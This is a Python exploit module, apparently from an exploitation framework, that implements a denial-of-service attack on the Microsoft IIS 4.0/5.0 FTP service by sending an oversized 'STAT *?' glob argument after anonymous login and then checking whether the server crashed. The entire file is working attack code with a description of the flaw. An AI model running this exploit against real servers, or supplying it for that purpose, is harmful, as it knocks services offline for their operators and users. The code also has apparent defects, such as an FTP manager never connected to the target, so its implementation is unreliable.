import socket, time

from interfaces.hasparameters import StringParam, KeyListParam
import interfaces.exploit as exploit
from interfaces.exploit import Exploit, ExploitError
import managers.ftp as FTP

desc =	''' 
<br>
<hr><center><big><b>
 Microsoft FTP DOS
</b></big></center><hr>
<br>
<b>Vulnerability:</b><hr>		

<br><br>
The Microsoft FTP service contains a vulnerability in the STAT
command with the pattern-matching (glob) code. This vulnerability
could be exploited to execute a Denial of Service attack. This
affects IIS 4.0 and 5.0 and requires the attacker to be able to
access the service either through a valid user account or via the
anonymous login which is enabled by default. The DoS attack will
bring down all services running under IIS (the inetinfo.exe process).

IIS 4.0 must be manually restarted to restore normal operation. IIS 5.0
will automatically restart the crashed services, but any users connected
to the service at the time of exploitation must reconnect.

At this time, there seems to be a slim-to-none chance of being able to
execute arbitrary code through this vulnerability.

<br><br>
<b>References</b><hr>

<br>
<b>Attack Details</b><hr>

<br><br><br>
'''

class MsFTPDos(Exploit):
	def __init__(self):
		Exploit.__init__(self,'Ms ftp denial of service', desc)
		self.result       = ''
		
	def execute(self):
		self.result = None
		ftp = FTP.FTPManager()
		
		self.log.info("Open an auxiliary FTP connection")
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((self.get_target_ip(),21))

		self.log.info("Sending login...")
		ftp.send_cmd('user anonymous')
		resp = ftp.get_ftp_response()
		ftp.send_cmd('pass foo@bar.com')
		resp = ftp.get_ftp_response()
		self.log.info("Logged in")

		exp = "A"*240

		ftp.send_cmd("cwd /");
		reply = ftp.get_ftp_response()

		self.log.info("Sending the big parameter...")
		ftp.send_cmd("STAT *?"+exp);
		
		ftp.close()
		
		self.log.info("Test if the FTP server is still running")
		try:
			s.send("ussser");
			s.recv()			
			s.close()
			self.result = exploit.RES_FAIL
		except:
			self.log.debug("FTP Server crashed ;)")
			self.result = exploit.RES_OK
		
	def isSuccessful(self):
		return self.result


	


